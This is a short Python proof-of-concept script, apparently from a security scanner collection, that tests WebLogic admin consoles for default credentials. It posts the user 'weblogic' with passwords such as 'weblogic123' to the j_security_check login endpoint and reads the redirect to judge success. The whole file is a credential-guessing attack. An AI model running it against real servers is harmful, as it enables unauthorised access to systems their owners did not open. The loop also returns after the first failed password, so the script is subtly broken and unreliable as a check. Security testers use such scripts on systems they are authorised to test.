#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Copyright (c) saucerman (https://saucer-man.com)
See the file 'LICENSE' for copying permission
"""
"""
name: weblogic 弱口令漏洞
referer: unknown
description: weblogic 后台弱口令
"""
import sys
import json
import warnings
import requests


def poc(url):
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Content-Type":"application/x-www-form-urlencoded"
    }
    payload = "/console/j_security_check"
    passwd = ["weblogic", "weblogic1", "weblogic12", "weblogic123"]
    vulnurl = url + payload
    for pwd in passwd:
        post_data = {
            "j_username":"weblogic",
            "j_password":pwd
        }
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False, allow_redirects=False)
            if req.status_code == 302 and r"console" in req.text and r"LoginForm.jsp" not in req.text:
                return vulnurl + json.dumps(post_data, indent=4)
            else:
                return False
        except:
            return False

